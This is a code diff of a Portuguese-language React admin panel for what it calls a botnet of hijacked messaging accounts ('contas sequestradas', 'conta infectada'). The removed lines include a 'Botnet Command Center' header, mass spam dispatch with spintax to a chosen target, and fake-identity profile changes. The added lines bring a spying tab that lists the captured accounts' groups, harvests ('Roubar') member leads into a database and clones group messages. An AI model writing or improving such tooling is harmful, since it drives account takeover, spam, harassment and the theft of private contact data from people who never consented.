@@ -1,16 +1,20 @@
 import { useState, useEffect } from 'react';
 
 export default function AdminPanel() {
+  const [tab, setTab] = useState('attack'); // 'attack' ou 'spy'
   const [sessions, setSessions] = useState([]);
-  const [target, setTarget] = useState(''); 
-  const [msg, setMsg] = useState('{Olá|Oi}, vi que tem interesse em conteúdo VIP. {Confira|Veja} aqui: https://seulink.com');
   const [logs, setLogs] = useState([]);
   const [selectedPhones, setSelectedPhones] = useState(new Set());
   const [processing, setProcessing] = useState(false);
-  
-  // Estados para Troca de Identidade
-  const [newName, setNewName] = useState('');
-  const [photoUrl, setPhotoUrl] = useState('');
+
+  // Estados do Ataque
+  const [target, setTarget] = useState(''); 
+  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
+
+  // Estados da Espionagem
+  const [spyPhone, setSpyPhone] = useState('');
+  const [chats, setChats] = useState([]);
+  const [loadingChats, setLoadingChats] = useState(false);
 
   // Carrega lista ao iniciar
   const fetchSessions = async () => {
@@ -18,264 +22,162 @@ export default function AdminPanel() {
       const res = await fetch('/api/list-sessions');
       const data = await res.json();
       setSessions(data.sessions || []);
-    } catch (e) {
-      addLog('Erro ao carregar sessões.', 'error');
-    }
+    } catch (e) { addLog('Erro ao carregar sessões.', 'error'); }
   };
 
   useEffect(() => { fetchSessions(); }, []);
 
-  // Adiciona log no "Terminal"
   const addLog = (text) => {
     const time = new Date().toLocaleTimeString();
     setLogs(prev => [`[${time}] ${text}`, ...prev]);
   };
 
-  // Seleção de Contas
   const toggleSelect = (phone) => {
     const newSet = new Set(selectedPhones);
-    if (newSet.has(phone)) newSet.delete(phone);
-    else newSet.add(phone);
+    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
     setSelectedPhones(newSet);
   };
 
-  const selectAll = () => {
-    if (selectedPhones.size === sessions.length) setSelectedPhones(new Set());
-    else setSelectedPhones(new Set(sessions.map(s => s.phone_number)));
-  };
-
-  // Ação: Verificar Saúde
-  const checkHealth = async () => {
-    if (selectedPhones.size === 0) return alert('Selecione contas para verificar');
-    setProcessing(true);
-    addLog(`=== Iniciando verificação de ${selectedPhones.size} contas ===`);
-
-    for (const phone of selectedPhones) {
-        addLog(`Verificando ${phone}...`);
-        try {
-            const res = await fetch('/api/check-status', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone })
-            });
-            const data = await res.json();
-            if (data.status === 'alive') addLog(`${phone} está ONLINE ✅`);
-            else addLog(`${phone} parece MORTA/BANIDA ❌`);
-        } catch (e) {
-            addLog(`${phone} erro de conexão ⚠️`);
-        }
-    }
-    setProcessing(false);
-    fetchSessions(); // Recarrega lista
-  };
-
-  // Ação: Disparo em Massa
+  // --- FUNÇÕES DE ATAQUE ---
   const handleMassFire = async () => {
-    if (!target) return alert('Defina um alvo (@usuario ou número)');
-    if (selectedPhones.size === 0) return alert('Selecione contas para enviar');
-    
+    if (!target || selectedPhones.size === 0) return alert('Configure alvo e selecione contas');
     setProcessing(true);
-    addLog(`=== Iniciando disparo para ${target} ===`);
-
-    const phones = Array.from(selectedPhones);
-
-    for (const phone of phones) {
-        addLog(`🚀 Enviando de: ${phone}...`);
-        
+    addLog(`=== Iniciando disparo ===`);
+    for (const phone of Array.from(selectedPhones)) {
         try {
             const res = await fetch('/api/dispatch', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    senderPhone: phone,
-                    target: target,
-                    message: msg
-                })
+                body: JSON.stringify({ senderPhone: phone, target, message: msg })
             });
-
             const data = await res.json();
-            
-            if (res.ok) {
-                addLog(`✅ Sucesso (${phone}): "${data.msg_sent}"`);
-            } else {
-                addLog(`❌ Erro (${phone}): ${data.error}`);
-            }
-
-            // Pequeno delay (500ms)
-            await new Promise(r => setTimeout(r, 500));
-
-        } catch (e) {
-            addLog(`❌ Erro Crítico: ${e.message}`);
-        }
+            if (res.ok) addLog(`✅ ${phone}: Enviado`);
+            else addLog(`❌ ${phone}: ${data.error}`);
+        } catch (e) { addLog(`❌ Erro crítico em ${phone}`); }
     }
     setProcessing(false);
-    addLog(`=== Fim do Processo ===`);
   };
 
-  // Ação: Alterar Identidade
-  const handleUpdateProfile = async () => {
-    if (selectedPhones.size === 0) return alert('Selecione contas para mudar a identidade');
-    if (!newName && !photoUrl) return alert('Preencha nome ou URL da foto');
-
-    setProcessing(true);
-    addLog(`=== Iniciando Transformação de ${selectedPhones.size} contas ===`);
-
-    const phones = Array.from(selectedPhones);
-
-    for (const phone of phones) {
-        addLog(`🎭 Transformando ${phone}...`);
-        
-        try {
-            const res = await fetch('/api/update-profile', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone,
-                    newName: newName,
-                    photoUrl: photoUrl
-                })
-            });
-
-            const data = await res.json();
-            if (res.ok) addLog(`✅ Identidade alterada: ${phone}`);
-            else addLog(`❌ Falha: ${data.error}`);
-
-            // Delay maior (2s) para segurança
-            await new Promise(r => setTimeout(r, 2000));
-
-        } catch (e) {
-            addLog(`Erro: ${e.message}`);
+  // --- FUNÇÕES DE ESPIONAGEM ---
+  const loadChats = async (phone) => {
+    setSpyPhone(phone);
+    setLoadingChats(true);
+    setChats([]);
+    addLog(`🔍 Varrendo grupos da conta ${phone}...`);
+    
+    try {
+        const res = await fetch('/api/spy/list-chats', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone })
+        });
+        const data = await res.json();
+        if(data.chats) {
+            setChats(data.chats);
+            addLog(`Encontrados ${data.chats.length} grupos/canais.`);
         }
-    }
-    setProcessing(false);
+    } catch (e) { addLog(`Erro ao listar chats: ${e.message}`); }
+    setLoadingChats(false);
+  };
+
+  const harvestLeads = async (chatId, chatName) => {
+    if(!confirm(`Extrair leads do grupo "${chatName}" usando ${spyPhone}?`)) return;
+    addLog(`🕷️ Roubando leads de: ${chatName}...`);
+    
+    try {
+        const res = await fetch('/api/spy/harvest', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: spyPhone, chatId, chatName })
+        });
+        const data = await res.json();
+        addLog(`✅ Sucesso! ${data.count} leads salvos no banco.`);
+    } catch (e) { addLog(`❌ Falha na extração.`); }
+  };
+
+  const cloneContent = async (chatId) => {
+    if(!confirm(`Clonar últimas 10 msgs deste grupo para o "Saved Messages" da conta infectada?`)) return;
+    addLog(`©️ Clonando conteúdo...`);
+    try {
+        const res = await fetch('/api/spy/clone', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: spyPhone, fromChatId: chatId, limit: 10 })
+        });
+        addLog(`✅ Clonagem concluída.`);
+    } catch (e) { addLog(`❌ Erro ao clonar.`); }
   };
 
   return (
     <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
+      <h1 style={{ color: '#58a6ff' }}>🔥 HotTrack Admin</h1>
       
-      {/* Header */}
-      <div style={{ borderBottom: '1px solid #30363d', paddingBottom: '20px', marginBottom: '20px' }}>
-        <h1 style={{ color: '#58a6ff', margin: 0 }}>🕵️ Botnet Command Center</h1>
-        <p style={{ color: '#8b949e', margin: '5px 0' }}>{sessions.length} contas sequestradas no total</p>
+      {/* Abas */}
+      <div style={{ marginBottom: '20px', borderBottom: '1px solid #30363d' }}>
+        <button onClick={() => setTab('attack')} style={{ padding: '10px 20px', background: tab === 'attack' ? '#238636' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>⚔️ Ataque / Disparo</button>
+        <button onClick={() => setTab('spy')} style={{ padding: '10px 20px', background: tab === 'spy' ? '#1f6feb' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🕵️ Espionagem</button>
       </div>
 
       <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
         
-        {/* Coluna da Esquerda: Controles */}
+        {/* Coluna Esquerda: Ações */}
         <div>
-          {/* Bloco 1: Disparo */}
-          <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #30363d', marginBottom: '20px' }}>
-            <h3 style={{ marginTop: 0 }}>🎯 Configuração do Ataque</h3>
-            
-            <label style={{ display: 'block', marginBottom: '5px', fontSize: '12px' }}>Alvo (Username ou Telefone)</label>
-            <input 
-              type="text" 
-              placeholder="@usuario_alvo" 
-              value={target}
-              onChange={e => setTarget(e.target.value)}
-              style={{ width: '100%', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '4px', marginBottom: '15px' }}
-            />
-
-            <label style={{ display: 'block', marginBottom: '5px', fontSize: '12px' }}>Mensagem (Use {'{Spintax|Assim}'})</label>
-            <textarea 
-              value={msg}
-              onChange={e => setMsg(e.target.value)}
-              style={{ width: '100%', height: '100px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '4px', marginBottom: '15px' }}
-            />
-
-            <div style={{ display: 'flex', gap: '10px' }}>
-                <button 
-                  onClick={handleMassFire}
-                  disabled={processing}
-                  style={{ flex: 1, padding: '12px', background: processing ? '#23863655' : '#238636', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontWeight: 'bold' }}
-                >
-                  {processing ? 'EXECUTANDO...' : '🔥 DISPARAR EM MASSA'}
-                </button>
-                
-                <button 
-                  onClick={checkHealth}
-                  disabled={processing}
-                  style={{ padding: '12px', background: '#1f6feb', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
-                >
-                  🩺 Check Status
-                </button>
-            </div>
-          </div>
-
-          {/* Bloco 2: Identidade */}
-          <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #30363d' }}>
-            <h3 style={{ marginTop: 0, color: '#d2a8ff' }}>🎭 Camuflagem / Identidade</h3>
-            
-            <input 
-              type="text" 
-              placeholder="Novo Nome (Ex: Atendente Julia)" 
-              value={newName}
-              onChange={e => setNewName(e.target.value)}
-              style={{ width: '100%', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '4px', marginBottom: '10px' }}
-            />
-
-            <input 
-              type="text" 
-              placeholder="URL da Foto (JPG/PNG)" 
-              value={photoUrl}
-              onChange={e => setPhotoUrl(e.target.value)}
-              style={{ width: '100%', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '4px', marginBottom: '15px' }}
-            />
-            
-            <button 
-              onClick={handleUpdateProfile}
-              disabled={processing}
-              style={{ width: '100%', padding: '12px', background: '#8957e5', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontWeight: 'bold' }}
-            >
-              APLICAR NOVA IDENTIDADE
-            </button>
-          </div>
-
-          {/* Terminal de Logs */}
-          <div style={{ marginTop: '20px', backgroundColor: '#000', padding: '15px', borderRadius: '6px', border: '1px solid #30363d', height: '300px', overflowY: 'auto', fontSize: '12px' }}>
-            <div style={{ color: '#58a6ff', marginBottom: '10px' }}>root@hot-track:~# logs</div>
-            {logs.map((l, i) => (
-                <div key={i} style={{ marginBottom: '4px', color: l.includes('❌') ? '#ff7b72' : l.includes('✅') ? '#3fb950' : '#8b949e' }}>
-                    {l}
+            {tab === 'attack' && (
+                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
+                    <h3>Configuração de Disparo</h3>
+                    <input type="text" placeholder="@alvo" value={target} onChange={e => setTarget(e.target.value)} style={{ width: '100%', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
+                    <textarea value={msg} onChange={e => setMsg(e.target.value)} style={{ width: '100%', height: '80px', padding: '10px', marginBottom: '10px', background: '#0d1117', border: '1px solid #30363d', color: '#fff' }} />
+                    <button onClick={handleMassFire} disabled={processing} style={{ width: '100%', padding: '10px', background: '#238636', color: 'white', border: 'none' }}>DISPARAR</button>
                 </div>
-            ))}
-            {logs.length === 0 && <span style={{color: '#333'}}>Aguardando comandos...</span>}
-          </div>
+            )}
+
+            {tab === 'spy' && (
+                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
+                    <h3>Modo Espião</h3>
+                    {!spyPhone ? <p>Selecione uma conta na direita para espiar.</p> : (
+                        <>
+                            <p>Conta selecionada: <strong style={{color: '#58a6ff'}}>{spyPhone}</strong></p>
+                            {loadingChats && <p>Carregando grupos...</p>}
+                            <div style={{ maxHeight: '400px', overflowY: 'auto' }}>
+                                {chats.map(c => (
+                                    <div key={c.id} style={{ padding: '10px', borderBottom: '1px solid #30363d', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                                        <div>
+                                            <div style={{fontWeight: 'bold'}}>{c.title}</div>
+                                            <div style={{fontSize: '12px', color: '#8b949e'}}>{c.type} • {c.participants_count} membros</div>
+                                        </div>
+                                        <div style={{display: 'flex', gap: '5px'}}>
+                                            <button onClick={() => harvestLeads(c.id, c.title)} style={{ fontSize: '10px', padding: '5px', background: '#d29922', border: 'none', cursor: 'pointer' }}>🕷️ Roubar</button>
+                                            <button onClick={() => cloneContent(c.id)} style={{ fontSize: '10px', padding: '5px', background: '#8957e5', border: 'none', cursor: 'pointer' }}>©️ Clonar</button>
+                                        </div>
+                                    </div>
+                                ))}
+                            </div>
+                        </>
+                    )}
+                </div>
+            )}
+
+            {/* Terminal de Logs */}
+            <div style={{ marginTop: '20px', backgroundColor: '#000', padding: '15px', borderRadius: '6px', height: '200px', overflowY: 'auto', fontSize: '12px' }}>
+                {logs.map((l, i) => <div key={i}>{l}</div>)}
+            </div>
         </div>
 
-        {/* Coluna da Direita: Lista de Contas */}
-        <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px', border: '1px solid #30363d', overflowY: 'auto', maxHeight: '800px' }}>
-            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px' }}>
-                <h3 style={{ margin: 0 }}>🤖 Exército ({selectedPhones.size} selecionados)</h3>
-                <button 
-                    onClick={selectAll}
-                    style={{ background: 'transparent', border: '1px solid #30363d', color: '#58a6ff', padding: '5px 10px', borderRadius: '4px', cursor: 'pointer', fontSize: '12px' }}
-                >
-                    {selectedPhones.size === sessions.length ? 'Desmarcar Todos' : 'Marcar Todos'}
-                </button>
-            </div>
-
+        {/* Coluna Direita: Contas */}
+        <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
+            <h3>Contas ({sessions.length})</h3>
             {sessions.map(s => (
-                <div 
-                    key={s.id} 
-                    onClick={() => toggleSelect(s.phone_number)}
-                    style={{ 
-                        display: 'flex', 
-                        alignItems: 'center', 
-                        padding: '10px', 
-                        marginBottom: '8px', 
-                        borderRadius: '4px', 
-                        cursor: 'pointer',
-                        border: selectedPhones.has(s.phone_number) ? '1px solid #238636' : '1px solid transparent',
-                        backgroundColor: selectedPhones.has(s.phone_number) ? '#23863622' : '#21262d'
-                    }}
-                >
-                    <div style={{ width: '10px', height: '10px', borderRadius: '50%', backgroundColor: selectedPhones.has(s.phone_number) ? '#3fb950' : '#484f58', marginRight: '10px' }}></div>
-                    <div style={{ flex: 1 }}>
-                        <div style={{ fontWeight: 'bold' }}>{s.phone_number}</div>
-                        <div style={{ fontSize: '10px', color: '#8b949e' }}>Capturado: {new Date(s.created_at).toLocaleDateString()}</div>
-                    </div>
-                    <span style={{ fontSize: '10px', background: '#30363d', padding: '2px 6px', borderRadius: '10px' }}>ID: {s.id}</span>
+                <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '10px', background: '#21262d', marginBottom: '5px' }}>
+                    <div>{s.phone_number}</div>
+                    {tab === 'attack' ? (
+                        <button onClick={() => toggleSelect(s.phone_number)} style={{ background: selectedPhones.has(s.phone_number) ? '#238636' : '#30363d', border: 'none', color: 'white', padding: '2px 10px', cursor: 'pointer' }}>
+                           {selectedPhones.has(s.phone_number) ? 'V' : 'Select'}
+                        </button>
+                    ) : (
+                        <button onClick={() => loadChats(s.phone_number)} style={{ background: '#1f6feb', border: 'none', color: 'white', padding: '2px 10px', cursor: 'pointer' }}>
+                           Espiar
+                        </button>
+                    )}
                 </div>
             ))}
         </div>
